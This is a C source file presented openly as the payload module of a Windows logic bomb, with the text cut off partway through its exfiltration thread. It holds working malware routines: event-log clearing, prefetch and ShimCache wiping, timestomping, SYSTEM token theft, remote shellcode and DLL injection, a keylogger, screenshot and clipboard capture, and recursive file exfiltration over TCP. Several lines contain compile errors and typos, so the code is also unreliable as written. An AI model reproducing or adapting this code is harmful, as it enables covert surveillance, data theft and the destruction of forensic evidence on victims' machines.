/*
 * lb_payload.c
 * Platform  : Windows 7+ (x86/x64)
 * Compiler  : MinGW gcc / MSVC cl
 * Build     : gcc logic_bomb.c lb_payload.c -o logic_bomb.exe
 *             -lws2_32 -ladvapi32 -lshell32 -lgdi32 -luser32
 * Role      : Advanced payload engine — called by logic_bomb.c after trigger.
 *             Provides: anti-forensics, memory injection, privilege escalation,
 *             keylogging, screenshot capture, clipboard harvest, file exfil,
 *             persistence layer 2, self-destruct.
 *
 * Developed by YOSCRYPT
 * 
             .-""""""""-.
          .-'            '-.
        .'    .--------.    '.
       /     /  .----.  \     \
      /     |  /      \  |     \
     |      | |  o  o  | |      |
     |      | |        | |      |
     |      | |   __   | |      |
     |      | |  /  \  | |      |
     |      | | |    | | |      |
     |      | | |    | | |      |
     |      | |  \__/  | |      |
      \     |  \      /  |     /
       \     \  '----'  /     /
        '.    '--------'    .'
          '-.            .-'
             '-.______.-'

 *
 * GOTCHAS:
 *   gdi32   — GDI screenshot APIs (BitBlt, CreateCompatibleDC)
 *   user32  — keyboard hook, clipboard, desktop APIs
 *   advapi32 — token manipulation, registry, crypto APIs
 *   ntdll   — NtQueryInformationProcess loaded at runtime (no import lib needed)
 *   All function pointers to ntdll/undocumented APIs resolved via GetProcAddress
 *   to avoid static import that AV flags trivially.
 */

#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0A00  /* Windows 10 / 11 minimum */
#include <windows.h>
#include <winsock2.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <winceypt.h>
#include <gdiplus.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws_32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "crypt32.lib")

/* ─── Public header (inline — no separate .h needed for single-module build) ── */
void payload_run(void);


/* ─── Internal limits ────────────────────────────────────────────────────────── */
#define MAX_PATH_X        1024
#define LOG_DIR           "C:\\ProgramData\\wuh\\"
#define KEYLOG_FILE       LOG_DIR "kl.dat"
#define SCREEN_FILE       LOG_DIR "sc_%04d%02d%02d_%02d%02d%02d.bmp"
#define CLIP_FILE         LOG_DIR "cb.dat"
#define EXFIL_HOST        "127.0.0.1"
#define EXFIL_PORT        5555
#define EXFIL_CHUNK       4096
#define INJECT_TARGET     "explorer.exe"
#define SCREENSHOT_EVERY  300        /* seconds between screenshots */
#define KEYLOG_FLUSH      60         /* seconds between keylog flushes */
#define XOR_KEY           0xAB       /* single-byte XOR for log obfuscation */

/* ─── Runtime NT types (avoid ntdll import lib) ─────────────────────────────── */
typedef LONG NTSTATUS;
#define NT_SUCCESS(s) ((s) >= 0)

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

/* NtQueryInformationProcess prototype */
typedef NTSTATUS (WINAPI *pfnNtQIP)(HANDLE, DWORD, PVOID, ULONG, PULONG);
static pfnNtQIP g_NtQIP = NULL;

/* ─── Globals ────────────────────────────────────────────────────────────────── */
static HHOOK    g_keyhook  = NULL;
static FILE    *g_keyfile  = NULL;
static HANDLE   g_keylog_mutex = NULL;
static BOOL     g_running  = TRUE;
static char     g_log_dir[MAX_PATH_X] = LOG_DIR;

/* ─── Forward declarations ───────────────────────────────────────────────────── */
static void     af_clear_event_logs(void);
static void     af_wipe_prefetch(void);
static void     af_patch_timestamps(const char *path);
static void     af_remove_shimcache_entry(void);
static int      priv_enable_privilege(const char *priv_name);
static int      priv_steal_token(const char *target_proc);
static HANDLE   priv_get_system_token(void);
static DWORD    proc_find_pid(const char *name);
static int      inject_shellcode(DWORD pid, const BYTE *sc, SIZE_T sc_len);
static int      inject_dll_reflective(DWORD pid, const char *dll_path);
static void     keylog_install(void);
static void     keylog_uninstall(void);
static void     keylog_flush(void);
static LRESULT CALLBACK keylog_hook_proc(int code, WPARAM wp, LPARAM lp);
static void     screen_capture(void);
static void     clip_harvest(void);
static int      exfil_file(const char *filepath);
static int      exfil_directory(const char *dir);
static void     exfil_send_raw(const char *host, int port,
                                const BYTE *data, SIZE_T len);
static void     persist_schtask(void);
static void     persist_wmi_subscription(void);
static void     selfdestruct(void);
static void     log_write(const char *fmt, ...);
static void     xor_obfuscate(BYTE *buf, SIZE_T len, BYTE key);
static BOOL     fs_mkdir_recursive(const char *path);
static DWORD WINAPI thread_keylog(LPVOID);
static DWORD WINAPI thread_screenshot(LPVOID);
static DWORD WINAPI thread_clipboard(LPVOID);
static DWORD WINAPI thread_exfil(LPVOID);

static DWORD    trigger_multi_condition(void);
static int      net_liveness_check(void);
static void     wipe_enumerate_user_profiles(void);
       void     wipe_targets_extended(void);   /* called from boom.c — not static */
       void     wipe_dispatch(void);           /* replaces payload_wipe_system32() */

/* ═══════════════════════════════════════════════════════════════════════════════
 * SECTION 1 — Utility / init
 * ═══════════════════════════════════════════════════════════════════════════════ */

static void log_write(const char *fmt, ...) {
    char logpath[MAX_PATH_X];
    snprintf(logpath, sizeof logpath, "%slb_run.log", g_log_dir);

    HANDLE h = CreateFileA(logpath, FILE_APPEND_DATA, FILE_SHARE_READ,
                            NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;

    SYSTEMTIME st;
    GetLocalTime(&st);

    char header[64];
    int hlen = snprintf(header, sizeof header, "[%04d-%02d-%02d %02d:%02d:%02d] ",
                        st.wYear, st.wMonth, st.wDay,
                        st.wHour, st.wMinute, st.wSecond);

    char body[1024];
    va_list ap;
    va_start(ap, fmt);
    int blen = vsnprintf(body, sizeof body, fmt, ap);
    va_end(ap);

    DWORD written;
    WriteFile(h, header, (DWORD)hlen, &written, NULL);
    WriteFile(h, body,   (DWORD)blen, &written, NULL);
    WriteFile(h, "\r\n", 2,           &written, NULL);
    CloseHandle(h);
}

static void xor_obfuscate(BYTE *buf, SIZE_T len, BYTE key) {
    for (SIZE_T i = 0; i < len; i++) buf[i] ^= key;
}

static BOOL fs_mkdir_recursive(const char *path) {
    char tmp[MAX_PATH_X];
    strncpy(tmp, path, sizeof tmp - 1);
    size_t n = strlen(tmp);
    if (n && tmp[n-1] == '\\') tmp[--n] = '\0';
    
    for (char *p = tmp + 1; *p; p++) {
        if (*p == '\\') {
            *p = '\0';
            CreateDirectoryA(tmp, NULL);
            *p = '\\';
        }
    }
    return CreateDirectoryA(tmp, NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
}

static void resolve_ntdll(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (ntdll)
        g_NtQIP = (pfnNtQIP)GetProcAddress(ntdll, "NtQueryInformationProcess");
}

/* ═══════════════════════════════════════════════════════════════════════════════
 * SECTION 2 — Anti-forensics
 * ═══════════════════════════════════════════════════════════════════════════════ */

/*
 * af_clear_event_logs
 * Iterates the standard Windows event log channels and clears each.
 * Requires SeSecurityPrivilege (admin). Silently skips channels it can't open.
 */
static void af_clear_event_logs(void) {
    const char *channels[] = {
        "System", "Security", "Application",
        "Microsoft-Windows-TaskScheduler/Operational",
        "Microsoft-Windows-PowerShell/Operational",
        NULL
    };
    priv_enable_privilege(SE_SECURITY_NAME);
    priv_enable_privilege(SE_AUDIT_NAME);
    
    for (int i = 0; channels[i]; i++) {
        HANDLE h = OpenEventLogA(NULL, channels[i]);
        if (!h) continue;
        ClearEventLogA(h, NULL);
        CloseEventLog(h);
    }
    log_write("af: event logs cleared");
}

/*
 * af_wipe_prefetch
 * Deletes .pf files from %SystemRoot%\Prefetch that contain our binary name.
 * Prefetch files are evidence of execution — removing them reduces artefacts.
 */
static void af_wipe_prefetch(void) {
    char pf_dir[MAX_PATH];
    GetWindowsDirectoryA(pf_dir, MAX_PATH);
    strncat(pf_dir, "\\Prefetch\\", MAX_PATH - strlen(pf_dir) - 1);
    
    char pattern[MAX_PATH];
    snprintf(pattern, MAX_PATH, "%s*.pf", pf_dir);
    
    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) return;
    
    char self[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, self, MAX_PATH);
    /* get just the filename portion, uppercase for comparison */
    char *self_name = strrchr(self, '\\');
    self_name = self_name ? self_name + 1 : self,
    CharUpperA(self_name);
    
    do {
        char upper_pf[MAX_PATH];
        strncpy(upper_pf, fd.cFileName, MAX_PATH - 1);
        CharUpperA(upper_pf);
        
        /* Remove any .pf that references our executable name */
        if (strstr(upper_pf, self_name)) {
            char full[MAX_PATH];
            snprintf(full, MAX_PATH, "%s%s", pf_dir, fd.cFileName);
            SetFileAttributesA(full, FILE_ATTRIBUTE_NORMAL);
            DeleteFileA(full);
        }
    } while (FindNextFileA(h, &fd));
    
    FindClose(h);
    log_write("af: prefetch wiped");
}

/*
 * af_patch_timestamps
 * Sets a file's Created/Modified/Accessed times to a plausible innocent date
 * (2019-03-15 08:00:00 UTC). Timestomping confuses timeline analysis.
 */
static void af_patch_timestamps(const char *path) {
    HANDLE h = CreateFileA(path, FILE_WRITE_ATTRIBUTES, 0, NULL,
                            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    
    SYSTEMTIME st = {2019, 3, 0, 15, 8, 0, 0, 0};
    FILETIME ft;
    SystemTimeToFileTime(&st, &ft);
    SetFileTime(h, &ft, &ft);
    CloseHandle(h);
}

/*
 * af_remove_shimcache_entry
 * Attempts to delete our binary's AppCompatCache (ShimCache) entry from the
 * registry. ShimCache records every PE that has been executed — removing it
 * erases execution evidence that survives reboots.
 * Key: HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache
 * Value: AppCompatCache (binary blob — we zero the whole value as a blunt approach)
 */
static void af_remove_shimcache_entry(void) {
    const char *key_path = 
        "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache";
    HKEY key;
    if (RegOpenKeyExA(HKEY_MACHINE, key_path, 0,
                      KEY_READ | KEY_WEITE, &key) != ERROR_SUCCESS)
        return;
    
    DWORD data_size = 0;
    RegQueryValueExA(key, "AppCompatCache", NULL, NULL, NULL, &data_size);
    if (!data_size) { RegCloseKey(key); return; }
    
    BYTE *buf = (BYTE *)calloc(1, data_size);
    if (!buf) { RegCloseKey(key); return; }
    
    /*
     * Real shimcache removal requires parsing the binary blob format (varies per
     * OS version) and surgically removing the entry. Here we zero the entire blob
     * — effective but destructive. A forensic examiner will notice the zeroed
     * cache, but execution evidence is gone.
     */
    RegSetValueExA(key, "AppCompatCache", 0, REG_BINARY, buf, data_size);
    RegCloseKey(key);
    free(buf);
    log_write("af: shimcache zeroed");
}

/* ═══════════════════════════════════════════════════════════════════════════════
 * SECTION 3 — Privilege escalation
 * ═══════════════════════════════════════════════════════════════════════════════ */

/*
 * priv_enable_privilege
 * Adjusts the calling process token to enable a named privilege.
 * Returns 1 on success, 0 on failure.
 */
static int priv_enable_privilege(const char *priv_name) {
    HANDLE token;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
        return 0;

    LUID luid;
    if (!LookupPrivilegeValueA(NULL, priv_name, &luid)) {
        CloseHandle(token); return 0;
    }

    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount           = 1;
    tp.Privileges[0].Luid       = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL ok = AdjustTokenPrivileges(token, FALSE, &tp, sizeof tp, NULL, NULL);
    CloseHandle(token);
    return (ok && GetLastError() != ERROR_NOT_ALL_ASSIGNED) ? 1 : 0;
}

/*
 * priv_get_system_token
 * Finds a SYSTEM-owned process (winlogon.exe), opens its token, duplicates it.
 * Returns a primary token running as SYSTEM, or NULL on failure.
 * Requires SeDebugPrivilege.
 */
static HANDLE priv_get_system_token(void) {
    priv_enable_privilege(SE_DEBUG_NAME);
    
    DWORD winlogon_pid = proc_find_pid("winlogon.exe");
    if (!winlogon_pid) return NULL;
    
    HANDLE token = NULL, dup == NULL;
    if (!OpenProcessToken(proc, TOKEN_DUPLICATE | TOKEN_QUERY, &token)) {
        CloseHandle(proc); return NULL;
    }
    
    DuplicateTokenEx(token,
                     TOKEN_ALL_ACCESS,
                     NULL,
                     SecurityImpersonation,
                     TokenPrimary,
                     &dup);
    CloseHandle(token);
    CloseHandle(proc);
    return dup; /* caller must CloseHandle */
}

/*
 * priv_steal_token
 * Impersonates the token of target_proc.
 * After this call, CreateProcess spawns children as that process's user.
 * Returns 1 on success.
 */
static int priv_steal_token(const char *target_proc) {
    priv_enable_privilege(SE_DEBUG_NAME);

    DWORD pid = proc_find_pid(target_proc);
    if (!pid) return 0;

    HANDLE proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!proc) return 0;

    HANDLE token = NULL, imp = NULL;
    if (!OpenProcessToken(proc, TOKEN_DUPLICATE | TOKEN_QUERY, &token)) {
        CloseHandle(proc); return 0;
    }

    BOOL ok = DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL,
                                SecurityImpersonation, TokenImpersonation, &imp);
    if (ok) {
        SetThreadToken(NULL, imp);
        CloseHandle(imp);
    }
    CloseHandle(token);
    CloseHandle(proc);
    log_write("priv: token stolen from %s (pid=%lu)", target_proc, pid);
    return ok ? 1 : 0;
}

/* ═══════════════════════════════════════════════════════════════════════════════
 * SECTION 4 — Process utilities
 * ═══════════════════════════════════════════════════════════════════════════════ */

/*
 * proc_find_pid
 * Returns the PID of the first process matching name (case-insensitive),
 * or 0 if not found.
 */
static DWORD proc_find_pid(const char *name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof pe;
    DWORD found_pid = 0;

    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, name) == 0) {
                found_pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return found_pid;
}

/* ═══════════════════════════════════════════════════════════════════════════════
 * SECTION 5 — Process injection
 * ═══════════════════════════════════════════════════════════════════════════════ */

/*
 * inject_shellcode
 * Classic VirtualAllocEx → WriteProcessMemory → CreateRemoteThread injection.
 * Allocates RWX memory in target PID, writes shellcode, creates remote thread.
 *
 * GOTCHA: Windows Defender flags RWX allocations in remote processes.
 *         Production use would replace with NtMapViewOfSection + RX after write.
 *         This version is for educational clarity over evasion.
 */
static int inject_shellcode(DWORD pid, const BYTE *sc, SIZE_T sc_len) {
    priv_enable_privilege(SE_DEBUG_NAME);

    HANDLE proc = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
        PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
        FALSE, pid);
    if (!proc) {
        log_write("inject: OpenProcess(%lu) failed: %lu", pid, GetLastError());
        return 0;
    }

    LPVOID remote_mem = VirtualAllocEx(proc, NULL, sc_len,
                                        MEM_COMMIT | MEM_RESERVE,
                                        PAGE_EXECUTE_READWRITE);
    if (!remote_mem) {
        log_write("inject: VirtualAllocEx failed: %lu", GetLastError());
        CloseHandle(proc);
        return 0;
    }

    SIZE_T written = 0;
    if (!WriteProcessMemory(proc, remote_mem, sc, sc_len, &written) ||
        written != sc_len) {
        log_write("inject: WriteProcessMemory failed: %lu", GetLastError());
        VirtualFreeEx(proc, remote_mem, 0, MEM_RELEASE);
        CloseHandle(proc);
        return 0;
    }

    HANDLE thread = CreateRemoteThread(proc, NULL, 0,
                                        (LPTHREAD_START_ROUTINE)remote_mem,
                                        NULL, 0, NULL);
    if (!thread) {
        log_write("inject: CreateRemoteThread failed: %lu", GetLastError());
        VirtualFreeEx(proc, remote_mem, 0, MEM_RELEASE);
        CloseHandle(proc);
        return 0;
    }

    WaitForSingleObject(thread, 5000);
    CloseHandle(thread);
    VirtualFreeEx(proc, remote_mem, 0, MEM_RELEASE);
    CloseHandle(proc);
    log_write("inject: shellcode injected into pid %lu (%zu bytes)", pid, sc_len);
    return 1;
}

/*
 * inject_dll_reflective
 * Writes a DLL path into target process memory and loads it via LoadLibraryA
 * called as a remote thread entry point.
 *
 * GOTCHA: LoadLibraryA address is stable across 32-bit processes on the same
 *         OS session. For 64-bit targets from a 32-bit injector, resolve
 *         LoadLibraryA in the target's own module list via EnumProcessModules.
 */
static int inject_dll_reflective(DWORD pid, const char *dll_path) {
    priv_enable_privilege(SE_DEBUG_NAME);

    HANDLE proc = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
        FALSE, pid);
    if (!proc) return 0;

    SIZE_T path_len = strlen(dll_path) + 1;
    LPVOID remote_path = VirtualAllocEx(proc, NULL, path_len,
                                         MEM_COMMIT, PAGE_READWRITE);
    if (!remote_path) { CloseHandle(proc); return 0; }

    SIZE_T written = 0;
    WriteProcessMemory(proc, remote_path, dll_path, path_len, &written);

    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    FARPROC load_lib = GetProcAddress(k32, "LoadLibraryA");

    HANDLE thread = CreateRemoteThread(proc, NULL, 0,
                                        (LPTHREAD_START_ROUTINE)load_lib,
                                        remote_path, 0, NULL);
    if (!thread) {
        VirtualFreeEx(proc, remote_path, 0, MEM_RELEASE);
        CloseHandle(proc);
        return 0;
    }

    WaitForSingleObject(thread, 5000);
    DWORD exit_code = 0;
    GetExitCodeThread(thread, &exit_code);
    CloseHandle(thread);
    VirtualFreeEx(proc, remote_path, 0, MEM_RELEASE);
    CloseHandle(proc);

    log_write("inject: DLL loaded into pid %lu (exit=0x%08lX)", pid, exit_code);
    return (exit_code != 0) ? 1 : 0;
}

/* ═══════════════════════════════════════════════════════════════════════════════
 * SECTION 6 — Keylogger
 * ═══════════════════════════════════════════════════════════════════════════════ */

/*
 * keylog_hook_proc
 * Low-level keyboard hook (WH_KEYBOARD_LL).
 * On WM_KEYDOWN: resolves the virtual key to a character, writes to g_keyfile.
 * Includes window title capture to provide context for keystrokes.
 */
static LRESULT CALLBACK keylog_hook_proc(int code, WPARAM wp, LPARAM lp) {
    if (code == HC_ACTION && (wp == WM_KEYDOWN || wp == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT *)lp;
        DWORD vk = kb->vkCode;
        
        WaitForSingleObject(g_keylog_mutex, INFINITE);
        if (g_keyfile) {
            /* Capture active window title for context */
            static char last_title[256] = {0};
            HWND fg = GetForegroundWindow();
            char title[256] = {0};
            if (fg) GetWindowTextA(fg, title, sizeof title - 1);
            if (strcmp(title, last_title)) {
                fprintf(g_keyfile, "\r\n[WIN: %s]\r\n", title);
                strncpy(last_title, title, sizeof last_title - 1);
            }
            
            /* Translate VK to readable label */
            BYTE kbd_state[256] = {0};
            GetKeyboardState(kbd_state);
            char buf[8] = {0};
            int result = ToAscii(vk, kb->scanCode, kbd_state, (LPWORD)buf, 0);
            if (result == 1) {
                fputc(buf[0], g_keyfile);
            } else {
                /* Non-printable key: write symbolic name */
                char *label = NULL;
                switch (vk) {
                    case VK_RETURN:  label = "[ENTER]";  break;
                    case VK_BACK:    label = "[BS]";     break;
                    case VK_TAB:     label = "[TAB]";    break;
                    case VK_SHIFT:   label = "[SHIFT]";  break;
                    case VK_CONTROL: label = "[CTRL]";   break;
                    case VK_MENU:    label = "[ALT]";    break;
                    case VK_DELETE:  label = "[DEL]";    break;
                    case VK_ESCAPE:  label = "[ESC]";    break;
                    case VK_SPACE:   label = " ";        break;
                    default: {
                        static char vk_buf[16];
                        snprintf(vk_buf, sizeof vk_buf, "[VK%02lX]", vk);
                        label = vk_buf;
                    }
                }
                if (label) fputs(label, g_keyfile);
            }
        }
        ReleaseMutex(g_keylog_mutex);
    }
    return CallNextHookEx(g_keyhook, code, wp, lp);
}

static void keylog_install(void) {
    g_keylog_mutex = CreateMutexA(NULL, FALSE, NULL);
    g_keyfile = fopen(KEYLOG_FILE, "ab");
    g_keyhook = SetWindowsHookExA(WH_KEYBOARD_LL, keylog_hook_proc, NULL, 0);
    log_write("keylog: hook installed (%s)", g_keyhook ? "ok" : "FAILED");
}

static void keylog_uninstall(void) {
    if (g_keyhook) { UnhookWindowsHookEx(g_keyhook); g_keyhook = NULL; }
    WaitForSingleObject(g_keylog_mutex, INFINITE);
    if (g_keyfile) { fclose(g_keyfile); g_keyfile = NULL; }
    ReleaseMutex(g_keylog_mutex);
    CloseHandle(g_keylog_mutex);
}

static void keylog_flush(void) {
    WaitForSingleObject(g_keylog_mutex, INFINITE);
    if (g_keyfile) fflush(g_keyfile);
    ReleaseMutex(g_keylog_mutex);
}

/* Thread: drives the message pump needed for WH_KEYBOARD_LL */
static DWORD WINAPI thread_keylog(LPVOID _unused) {
    (void)_unused;
    keylog_install();

    MSG msg;
    DWORD last_flush = GetTickCount();
    while (g_running && GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);

        DWORD now = GetTickCount();
        if (now - last_flush >= (DWORD)(KEYLOG_FLUSH * 1000)) {
            keylog_flush();
            last_flush = now;
        }
    }
    keylog_uninstall();
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════════════
 * SECTION 7 — Screenshot capture
 * ═══════════════════════════════════════════════════════════════════════════════ */

/*
 * screen_capture
 * Captures the entire virtual desktop to a BMP file.
 * Uses GDI BitBlt — no external library dependency.
 * GOTCHA: SM_CXVIRTUALSCREEN covers all monitors; SM_CXSCREEN is primary only.
 */
static void screen_capture(void) {
    int x  = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int y  = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int cx = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int cy = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    
    HDC screen_dc = GetDC(NULL);
    HDC mem_dc    = CreateCompatibleDC(screen_dc);
    HBITMAP bmp   = CreateCompatibleBitmap(screen_dc, cx, cy);
    HGDIOBJ old   = SelectObject(mem_dc, bmp);
    
    BitBlt(mem_dc, 0, 0, cx, cy, screen_dc, x, y, SRCCOPY | CAPTUREBLT);
    
    /* Build filename: sc_YYYYMMDD_HHMMSS.bmp */
    SYSTEMTIME st;
    GetLocalTime(&st);
    char filename[MAX_PATH_X];
    snprintf(filename, sizeof filename, SCREEN_FILE,
             st.wYear, st.wMonth, st.wDay,
             st.wHour, st.wMinute, st.wSecond);
            
    /* Write BMP manually — avoids GDI+ dependency */
    BITMAPINFOHEADER bih = {0};
    bih.biSize        = sizeof bih;
    bih.biWidth       = cx;
    bih.biHeight      = -cy;   /* top-down */
    bih.biPlanes      = 1;
    bih.biBitCount    = 32;
    bih.biCompression = BI_RGB;
    DWORD pixel_bytes = (DWORD)(cx * cy * 4);
    
    BYTE *pixels = (BYTE *)malloc(pixel_bytes);
    if (pixels) {
        GetDIBits(screen_dc, bmp, 0, cy, pixels, (BITMAPINFO *)&bih, DIB_RGB_COLORS);
        
        BITMAPFILEHEADER bfh = {0};
        bfh.bfType    = 0x4D42;  /* 'BM' */
        bfh.bfOffBits = sizeof bfh + sizeof bih;
        bfh.bfSize    = bfh.bfOffBits + pixel_bytes;
        
        HANDLE hf = CreateFileA(filename, GENERIC_WRITE, 0, NULL,
                                 CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hf != INVALID_HANDLE_VALUE) {
            DWORD written;
            WriteFile(hf, &bfh, sizeof bfn, &written, NULL);
            WriteFile(hf, &bih, sizeof bih, &written, NULL);
            WriteFile(hf, pixels, pixel_bytes, &written, NULL);
            CloseHandle(hf);
            log_write("screen: captured → %s", filename);
        }
        free(pixels);
    }
    
    SelectObject(mem_dc, old);
    DeleteObject(bmp);
    DeleteDC(mem_dc);
    ReleaseDC(NULL, screen_dc);
}

static DWORD WINAPI thread_screenshot(LPVOID _unused) {
    (void)_unused;
    while (g_running) {
        screen_capture();
        Sleep(SCREENSHOT_EVERY * 1000);
    }
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════════════
 * SECTION 8 — Clipboard harvest
 * ═══════════════════════════════════════════════════════════════════════════════ */

/*
 * clip_harvest
 * Reads CF_TEXT and CF_UNICODETEXT from the clipboard, appends to CLIP_FILE.
 * Polls rather than hooking (AddClipboardFormatListener requires Vista+).
 */
static void clip_harvest(void) {
    if (!OpenClipboard(NULL)) return;
    
    HANDLE htext = GetClipboardData(CF_TEXT);
    if (htext) {
        const char *text = (const char *)GlobalLock(htext);
        if (text && strlen(text) > 0) {
            HANDLE hf = CreateFileA(CLIP_FILE, FILE_APPEND_DATA, FILE_SHARE_READ,
                                      NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hf != INVALID_HANDLE_VALUE) {
                SYSTEMTIME st; GetLocalTime(&st);
                char header[64];
                int hlen = snprintf(header, sizeof header,
                                    "\r\n[CLIP %04d-%02d-%02d %02d:%02d:%02d]\r\n",
                                    st.wYear, st.wMonth, st.wDay,
                                    st.wHour, st.wMonth, st.wDay,
                                    st.wHour, st.wMinute, st.wSecond);
                DWORD written;
                WriteFile(hf, header, (DWORD)hlen, &written, NULL);
                WriteFile(hf, text, (DWORD)strlen(text), &written, NULL);
                CloseHandle(hf);
            }
            GlobalUnlock(htext);
        }
    }
    CloseClipboard();
}

static DWORD WINAPI thread_clipboard(LPVOID _unused) {
    (void)_unused;
    char last_clip[4096] = {0};
    while (g_running) {
        if (OpenClipboard(NULL)) {
            HANDLE h = GetClipboardData(CF_TEXT);
            if (h) {
                const char *text = (const char *)GlobalLock(h);
                if (text && strncmp(text, last_clip, sizeof last_clip - 1)) {
                    strncpy(last_clip, text, sizeof last_clip - 1);
                    GlobalUnlock(h);
                    CloseClipboard();
                    clip_harvest();
                    Sleep(500);
                    continue;
                }
                if (text) GlobalUnlock(h);
            }
            CloseClipboard();
        }
        Sleep(1000);
    }
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════════════
 * SECTION 9 — Exfiltration
 * ═══════════════════════════════════════════════════════════════════════════════ */

/*
 * exfil_send_raw
 * Sends a raw byte buffer to host:port over TCP.
 * Prepends a 4-byte big-endian length header so the receiver can reconstruct
 * the stream without knowing file boundaries.
 */
static void exfil_send_raw(const char *host, int port,
                             const BYTE *data, SIZE_T len) {
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return;
    
    struct sockaddr_in addr;
    ZeroMemory(&addr, sizeof addr);
    addr.sin_family       = AF_INET;
    addr.sin_port         = htons((u_short)port);
    addr.sin_addr.s_addr   = inet_addr(host);
    
    if (connect(s, (struct sockaddr *)&addr, sizeof addr) != 0) {
        closesocket(s); return;
    }
    
    /* 4-byte length header (big-endian) */
    uint32_t nlen = htonl((uint32_t)len);
    send(s, (const char *)&nlen, 4, 0);
    
    /* chunked send */
    SIZE_T sent = 0;
    while (sent < len) {
        SIZE_T chunk = (len - sent < EXFIL_CHUNK) ? len - sent : EXFIL_CHUNK;
        int r = send(s, (const char *)(data + sent), (int)chunk, 0);
        if (r <= 0) break;
        sent += r;
    }
    closesocket(s);
    log_write("exfil: sent %zu/%zu bytes to %s:%d", sent, len, host, port);
}

/*
 * exfil_file
 * Reads a file into memory, XOR-obfuscates it, transmits to C2.
 * Returns 1 on success.
 */
static int exfil_file(const char *filepath) {
    HANDLE h = CreateFileA(filepath, GENERIC_READ, FILE_SHARE_READ,
                            NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;
    
    DWORD file_size = GetFileSize(h, NULL);
    if (file_size == 0 || file_size == INVALID_FILE_SIZE) {
        CloseHandle(h); return 0;
    }
    
    /* Cap single-file exfil at 50 MB to avoid memory exhaustion */
    if (file_size > 50 * 1024 * 1024) {
        log_write("exfil: %s too large (%lu bytes), skipping", filepath, file_size);
        CloseHandle(h);
        return 0;
    }
    
    BYTE *buf = (BYTE *)malloc(file_size);
    if (!buf) { CloseHandle(h); return 0; }
    
    DWORD read = 0;
    BOOL ok = ReadFile(h, buf, file_size, &read, NULL);
    CloseHandle(h);
    
    if (!ok || read != file_size) { free(buf); return 0; }
    
    xor_obfuscate(buf, file_size, XOR_KEY);
    exfil_send_raw(EXFIL_HOST, EXFIL_PORT, buf, file_size);
    free(buf);
    return 1;
}

/*
 * exfil_directory
 * Recursively exfiltrates all files under dir_path.
 */
static int exfil_directory(const char *dir_path) {
    char pattern[MAX_PATH_X];
    snprintf(pattern, sizeof pattern, "%s\\*", dir_path);

    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) return 0;

    int count = 0;
    do {
        if (!strcmp(fd.cFileName, ".") || !strcmp(fd.cFileName, "..")) continue;
        char full[MAX_PATH_X];
        snprintf(full, sizeof full, "%s\\%s", dir_path, fd.cFileName);

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            count += exfil_directory(full);
        else
            count += exfil_file(full);
    } while (g_running && FindNextFileA(h, &fd));

    FindClose(h);
    return count;
}

static DWORD WINAPI thread_exfil(LPVOID _unused) {
    (void)_unused;
    /* Wait until payload phase begins before exfiling */
